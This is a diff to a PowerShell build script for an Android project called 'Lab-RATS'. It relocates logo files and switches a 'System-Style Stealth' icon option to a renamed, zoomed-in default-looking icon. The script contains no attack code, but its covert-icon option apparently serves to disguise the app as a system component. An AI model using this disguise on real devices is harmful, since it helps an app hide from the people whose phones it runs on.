@@ -12,8 +12,8 @@ $ErrorActionPreference = "Continue"
 $ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 $ProjectDir = Split-Path -Parent $ScriptDir
 $ConfigFile = Join-Path $ScriptDir "build_config.txt"
-$DefaultLogo = Join-Path $ProjectDir "app_logo.png"
-$CovertLogo = Join-Path $ScriptDir "covert_launcher.png"
+$DefaultLogo = Join-Path $ProjectDir "assets\app_logo.png"
+$CovertLogo = Join-Path $ProjectDir "assets\default_app_icon.png"
 
 # Default settings
 $DefaultSettings = @{
@@ -278,7 +278,7 @@ function Set-Logo {
     $resDir = Join-Path $ProjectDir "app\src\main\res"
     
     Write-Host "[>] Logo options:" -ForegroundColor Magenta
-    Write-Host "    1. Use System-Style Stealth logo (covert_launcher.png)"
+    Write-Host "    1. Use Recommended System-Style Stealth logo (default_app_icon.png)"
     Write-Host "    2. Use default Lab-RATS logo (app_logo.png)"
     Write-Host "    3. Use custom logo (provide image path)"
     Write-Host "    4. Skip (Keep project icons as is)"
@@ -375,9 +375,9 @@ function Set-Logo {
                    $graphics.PixelOffsetMode = [System.Drawing.Drawing2D.PixelOffsetMode]::HighQuality
                    $graphics.CompositingQuality = [System.Drawing.Drawing2D.CompositingQuality]::HighQuality
 
-                   # Draw resized (100% Scale for Stealth Icon)
+                   # Draw resized (125% Zoom for Stealth Icon)
                    if ($logoOption -eq "1") {
-                       $zoom = 1.00 # 100% Scale (Exact fit)
+                       $zoom = 1.25 # 125% Scale (Zoom In)
                        $offset = ($size * ($zoom - 1)) / 2
                        $graphics.DrawImage($srcImage, -$offset, -$offset, $size * $zoom, $size * $zoom)
                    } else {
